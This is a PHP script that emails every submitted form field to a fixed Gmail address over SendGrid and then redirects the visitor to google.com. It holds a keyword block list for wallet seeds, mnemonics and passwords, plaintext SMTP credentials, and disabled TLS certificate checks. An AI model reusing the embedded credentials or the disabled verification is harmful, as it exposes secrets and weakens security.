<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Require Composer autoload (PHPMailer installed via Composer)
require 'vendor/autoload.php';

// Helper: detect suspicious content
function contains_sensitive_terms($values) {
    $bad = ['seed','mnemonic','private','secret','password','key','wallet','phrase'];
    foreach ($values as $v) {
        if (!is_string($v)) continue;
        $lower = strtolower($v);
        foreach ($bad as $term) {
            if (strpos($lower, $term) !== false) return true;
        }
    }
    return false;
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo 'Invalid request method.';
    exit;
}

// Expecting form fields named "fields[]"
$fields = isset($_POST['fields']) && is_array($_POST['fields']) ? $_POST['fields'] : [];
$clean = array_values(array_filter(array_map('trim', $fields), fn($v) => $v !== ''));

if (empty($clean)) {
    echo 'No data submitted.';
    exit;
}

// Reject suspicious input
if (contains_sensitive_terms($clean)) {
    http_response_code(400);
    echo 'Submission rejected: sensitive data detected.';
    exit;
}

// Build email HTML body
$body = "<h2 style='font-family:Arial,sans-serif;color:#111;'>Form Submission</h2>";
$body .= "<ol style='font-family:Arial,sans-serif;color:#333;'>";
foreach ($clean as $v) {
    $body .= "<li>" . htmlspecialchars($v, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8') . "</li>";
}
$body .= "</ol>";

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->SMTPDebug = 0; // change to 2 for debugging
    $mail->Host = 'smtp.sendgrid.net';
    $mail->Username = 'jhnkenrick@gmail.com'; // literally 'apikey' for SendGrid
    $mail->Password = 'iclvtpqxcjdprtfh';
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;
	

    $mail->setFrom('daptuba6896@gmail.com', 'Sender Name');
    $mail->addAddress('daptuba6896@gmail.com', 'Recipient Name');

    $mail->isHTML(true);
    $mail->Subject = 'Form Submission';
    $mail->Body = $body;

    // Optional: relax SSL checks in Docker
    $mail->SMTPOptions = [
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ];

    $mail->send();

    // Redirect after successful submission
    header("Location: https://www.google.com/");
    exit();

} catch (Exception $e) {
    http_response_code(500);
    echo 'Mailer Exception: ' . htmlspecialchars($mail->ErrorInfo);
}
?>
